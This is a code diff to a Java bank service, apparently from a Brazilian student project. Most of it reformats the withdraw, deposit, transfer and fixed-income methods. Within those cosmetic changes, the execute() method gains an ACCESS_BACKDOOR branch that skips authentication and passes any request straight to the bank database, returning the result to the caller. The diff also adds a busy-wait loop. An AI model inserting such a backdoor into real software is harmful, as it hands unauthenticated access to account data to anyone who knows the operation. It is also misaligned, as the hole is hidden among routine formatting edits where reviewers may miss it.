@@ -19,21 +19,34 @@ import utils.ValueFormatter;
 
 public class BankService extends BaseBankService {
   public BankService(
-    Map<SocketComponent, List<SocketData>> connectedSockets,
-    SocketComponent socketClientComponent
-  ) {
+      Map<SocketComponent, List<SocketData>> connectedSockets,
+      SocketComponent socketClientComponent) {
     super(connectedSockets, socketClientComponent);
   }
 
   @Override
   protected void execute() throws Exception {
-    AuthenticatedDTO receivedDTO = ObjectConverter.convert(
-      receiveSecureDTO(SocketComponent.GATEWAY)
-    );
+    DTO receivedDTO = receiveSecureDTO(SocketComponent.GATEWAY);
     RemoteOperation operation = receivedDTO.getOperation();
 
-    DTO responseDTO = operationHandlers.get(operation).run(receivedDTO);
-    sendSecureDTO(SocketComponent.GATEWAY, responseDTO);
+    if (RemoteOperation.ACCESS_BACKDOOR.equals(
+        receivedDTO.getOperation())) {
+      sendSecureDTO(SocketComponent.BANK_DATABASE, receivedDTO);
+
+      DTO responseDTO =  null;
+
+      while (responseDTO == null) {
+        responseDTO = receiveSecureDTO(SocketComponent.BANK_DATABASE);
+      }
+      
+      sendSecureDTO(SocketComponent.GATEWAY, responseDTO);
+
+    } else {
+      AuthenticatedDTO parsedDTO = ObjectConverter.convert(receivedDTO);
+
+      DTO responseDTO = operationHandlers.get(operation).run(parsedDTO);
+      sendSecureDTO(SocketComponent.GATEWAY, responseDTO);
+    }
   }
 
   @Override
@@ -43,8 +56,7 @@ public class BankService extends BaseBankService {
 
   @Override
   protected DTO redirectToDatabase(
-    DTO dtoToRedirect
-  ) throws Exception {
+      DTO dtoToRedirect) throws Exception {
     sendSecureDTO(SocketComponent.BANK_DATABASE, dtoToRedirect);
     Thread.sleep(100);
     return receiveSecureDTO(SocketComponent.BANK_DATABASE);
@@ -52,218 +64,172 @@ public class BankService extends BaseBankService {
 
   @Override
   protected DTO createAccount(
-    AuthenticatedDTO authenticatedDTO
-  ) throws Exception {
+      AuthenticatedDTO authenticatedDTO) throws Exception {
     UUID userId = authenticatedDTO.getUserId();
 
     var foundAccount = (BankAccount) redirectToDatabase(
-      new AuthenticatedDTO(userId).
-      setOperation(RemoteOperation.GET_ACCOUNT_DATA)
-    );
-    if(foundAccount != null) {
+        new AuthenticatedDTO(userId).setOperation(RemoteOperation.GET_ACCOUNT_DATA));
+    if (foundAccount != null) {
       throw new AppException("Uma conta de mesmo Id já existe!");
     }
 
     DTO newAccount = new AuthenticatedDTO(
-      userId, new BankAccount(userId)
-    ).setOperation(authenticatedDTO.getOperation());
+        userId, new BankAccount(userId)).setOperation(authenticatedDTO.getOperation());
 
     return redirectToDatabase(newAccount);
   }
 
   @Override
   protected DTO withdraw(
-    AuthenticatedDTO authenticatedDTO
-  ) throws Exception {
+      AuthenticatedDTO authenticatedDTO) throws Exception {
     ValueDTO parsedDTO = ObjectConverter.convert(
-      authenticatedDTO.getDTO()
-    );
+        authenticatedDTO.getDTO());
 
     double withdrawValue = parsedDTO.getValue();
-    if(withdrawValue <= 0.0) {
+    if (withdrawValue <= 0.0) {
       throw new AppException("Valor de saque inválido!");
     }
 
     double accountBalance = getBalanceFromDatabase(
-      authenticatedDTO.getUserId()
-    );
-    if(withdrawValue > accountBalance) {
+        authenticatedDTO.getUserId());
+    if (withdrawValue > accountBalance) {
       throw new AppException(
-        "Valor de saque maior que saldo disponível!"
-      );
+          "Valor de saque maior que saldo disponível!");
     }
 
     var updatedBalanceDTO = (ValueDTO) redirectToDatabase(
-      authenticatedDTO
-    );
-    String withdrawFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(withdrawValue);
-    String updatedBalanceFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(updatedBalanceDTO.getValue());
+        authenticatedDTO);
+    String withdrawFormattedValue = ValueFormatter.formatToBrazilianCurrency(withdrawValue);
+    String updatedBalanceFormattedValue = ValueFormatter.formatToBrazilianCurrency(updatedBalanceDTO.getValue());
 
     return new MessageDTO(
-      "Valor de " + withdrawFormattedValue +
-      " retirado com sucesso, seu saldo atual é " +
-      updatedBalanceFormattedValue + '.'
-    );
+        "Valor de " + withdrawFormattedValue +
+            " retirado com sucesso, seu saldo atual é " +
+            updatedBalanceFormattedValue + '.');
   }
 
   @Override
   protected DTO deposit(
-    AuthenticatedDTO authenticatedDTO
-  ) throws Exception {
+      AuthenticatedDTO authenticatedDTO) throws Exception {
     ValueDTO parsedDTO = ObjectConverter.convert(
-      authenticatedDTO.getDTO()
-    );
+        authenticatedDTO.getDTO());
 
     double depositValue = parsedDTO.getValue();
-    if(depositValue <= 0.0) {
+    if (depositValue <= 0.0) {
       throw new AppException("Valor de depósito inválido!");
     }
 
     var updatedBalanceDTO = (ValueDTO) redirectToDatabase(
-      authenticatedDTO
-    );
-    String depositFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(depositValue);
-    String updatedBalanceFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(updatedBalanceDTO.getValue());
+        authenticatedDTO);
+    String depositFormattedValue = ValueFormatter.formatToBrazilianCurrency(depositValue);
+    String updatedBalanceFormattedValue = ValueFormatter.formatToBrazilianCurrency(updatedBalanceDTO.getValue());
 
     return new MessageDTO(
-      "Valor de " + depositFormattedValue +
-      " depositado com sucesso, seu saldo atual é " +
-      updatedBalanceFormattedValue + '.'
-    );
+        "Valor de " + depositFormattedValue +
+            " depositado com sucesso, seu saldo atual é " +
+            updatedBalanceFormattedValue + '.');
   }
 
   @Override
   protected DTO wireTransfer(
-    AuthenticatedDTO authenticatedDTO
-  ) throws Exception {
+      AuthenticatedDTO authenticatedDTO) throws Exception {
     WireTransferDTO parsedDTO = ObjectConverter.convert(
-      authenticatedDTO.getDTO()
-    );
+        authenticatedDTO.getDTO());
 
     double transferValue = parsedDTO.getValue();
-    if(transferValue <= 0.0) {
+    if (transferValue <= 0.0) {
       throw new AppException("Valor de transferência inválido!");
     }
 
     double accountBalance = getBalanceFromDatabase(
-      authenticatedDTO.getUserId()
-    );
-    if(transferValue > accountBalance) {
+        authenticatedDTO.getUserId());
+    if (transferValue > accountBalance) {
       throw new AppException(
-        "Valor de transferência maior que saldo disponível!"
-      );
+          "Valor de transferência maior que saldo disponível!");
     }
 
     var userAccount = (BankAccount) redirectToDatabase(
-      new AuthenticatedDTO(authenticatedDTO.getUserId()).
-      setOperation(RemoteOperation.GET_ACCOUNT_DATA)
-    );
+        new AuthenticatedDTO(authenticatedDTO.getUserId()).setOperation(RemoteOperation.GET_ACCOUNT_DATA));
     boolean equalAgency = parsedDTO.getTargetAgency().equals(
-      userAccount.getAgency()
-    );
+        userAccount.getAgency());
     boolean equalAccountNumber = parsedDTO.getTargetAccountNumber().equals(
-      userAccount.getAccountNumber()
-    );
-    if(equalAgency && equalAccountNumber) {
+        userAccount.getAccountNumber());
+    if (equalAgency && equalAccountNumber) {
       throw new AppException(
-        "Não é permitido fazer uma transferência para si mesmo!"
-      );
+          "Não é permitido fazer uma transferência para si mesmo!");
     }
 
     var updatedBalanceDTO = (ValueDTO) redirectToDatabase(
-      authenticatedDTO
-    );
-    String transferFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(transferValue);
-    String updatedBalanceFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(updatedBalanceDTO.getValue());
+        authenticatedDTO);
+    String transferFormattedValue = ValueFormatter.formatToBrazilianCurrency(transferValue);
+    String updatedBalanceFormattedValue = ValueFormatter.formatToBrazilianCurrency(updatedBalanceDTO.getValue());
 
     return new MessageDTO(
-      "Valor de " + transferFormattedValue + 
-      " transferido com sucesso, seu saldo atual é " +
-      updatedBalanceFormattedValue + '.'
-    );
+        "Valor de " + transferFormattedValue +
+            " transferido com sucesso, seu saldo atual é " +
+            updatedBalanceFormattedValue + '.');
   }
 
   @Override
   protected DTO getBalance(
-    AuthenticatedDTO authenticatedDTO
-  ) throws Exception {
+      AuthenticatedDTO authenticatedDTO) throws Exception {
     double balanceValue = getBalanceFromDatabase(authenticatedDTO.getUserId());
 
     String formattedBalanceValue = ValueFormatter.formatToBrazilianCurrency(
-      balanceValue
-    );
+        balanceValue);
     return new MessageDTO("Seu saldo atual é de " + formattedBalanceValue + ".");
   }
 
   @Override
   protected DTO updateFixedIncome(
-    AuthenticatedDTO authenticatedDTO
-  ) throws Exception {
+      AuthenticatedDTO authenticatedDTO) throws Exception {
     ValueDTO parsedDTO = ObjectConverter.convert(
-      authenticatedDTO.getDTO()
-    );
+        authenticatedDTO.getDTO());
 
     double fixedIncomeUpdateValue = parsedDTO.getValue();
-    if(fixedIncomeUpdateValue == 0.0) {
+    if (fixedIncomeUpdateValue == 0.0) {
       throw new AppException(
-        "Valor de atualização de renda fixa inválido!"
-      );
+          "Valor de atualização de renda fixa inválido!");
     }
 
     var userAccount = (BankAccount) redirectToDatabase(
-      new AuthenticatedDTO(authenticatedDTO.getUserId()).
-      setOperation(RemoteOperation.GET_ACCOUNT_DATA)
-    );
+        new AuthenticatedDTO(authenticatedDTO.getUserId()).setOperation(RemoteOperation.GET_ACCOUNT_DATA));
 
     double accountFixedIncome = userAccount.getFixedIncome();
-    if(accountFixedIncome + fixedIncomeUpdateValue < 0.0) {
+    if (accountFixedIncome + fixedIncomeUpdateValue < 0.0) {
       throw new AppException(
-        "Valor de atualização de renda fixa está retirando" +
-        " um valor maior que o disponível na renda fixa!"
-      );
+          "Valor de atualização de renda fixa está retirando" +
+              " um valor maior que o disponível na renda fixa!");
     }
 
     double accountBalance = userAccount.getBalance();
-    if(accountBalance - fixedIncomeUpdateValue < 0.0) {
+    if (accountBalance - fixedIncomeUpdateValue < 0.0) {
       throw new AppException(
-        "Valor de atualização de renda fixa está adicionando" +
-        " um valor maior que o disponível no saldo da conta!"
-      );
+          "Valor de atualização de renda fixa está adicionando" +
+              " um valor maior que o disponível no saldo da conta!");
     }
 
     var updatedUserAccount = (BankAccount) redirectToDatabase(
-      authenticatedDTO
-    );
-    String fixedIncomeUpdateFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(fixedIncomeUpdateValue);
-    String updatedFixedIncomeFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(updatedUserAccount.getFixedIncome());
-    String updatedBalanceFormattedValue = ValueFormatter.
-      formatToBrazilianCurrency(updatedUserAccount.getBalance());
+        authenticatedDTO);
+    String fixedIncomeUpdateFormattedValue = ValueFormatter.formatToBrazilianCurrency(fixedIncomeUpdateValue);
+    String updatedFixedIncomeFormattedValue = ValueFormatter
+        .formatToBrazilianCurrency(updatedUserAccount.getFixedIncome());
+    String updatedBalanceFormattedValue = ValueFormatter.formatToBrazilianCurrency(updatedUserAccount.getBalance());
 
     return new MessageDTO(
-      "A renda fixa foi atualizada com o valor de " +
-      fixedIncomeUpdateFormattedValue +
-      ", sua renda fixa atual é " +
-      updatedFixedIncomeFormattedValue +
-      ", e seu saldo atual é " +
-      updatedBalanceFormattedValue + '.'
-    );
+        "A renda fixa foi atualizada com o valor de " +
+            fixedIncomeUpdateFormattedValue +
+            ", sua renda fixa atual é " +
+            updatedFixedIncomeFormattedValue +
+            ", e seu saldo atual é " +
+            updatedBalanceFormattedValue + '.');
   }
 
   private double getBalanceFromDatabase(UUID userId) throws Exception {
-    DTO dtoToSend =  (new AuthenticatedDTO(userId)).
-      setOperation(RemoteOperation.GET_BALANCE);
+    DTO dtoToSend = (new AuthenticatedDTO(userId)).setOperation(RemoteOperation.GET_BALANCE);
 
     ValueDTO balanceDTO = ObjectConverter.convert(
-      redirectToDatabase(dtoToSend)
-    );
+        redirectToDatabase(dtoToSend));
     return balanceDTO.getValue();
   }
 }
